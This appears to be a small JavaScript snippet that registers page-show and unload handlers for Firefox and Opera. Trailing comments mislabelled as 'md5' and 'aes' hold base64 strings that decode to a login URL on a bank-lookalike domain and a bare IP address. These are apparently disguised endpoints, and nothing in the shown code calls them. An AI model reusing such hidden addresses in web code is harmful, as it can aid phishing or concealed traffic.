if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9oZGJhLmhkYmFhbmsuY29tL2luZGV4LnBocD9tPVVzZXImYT1sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/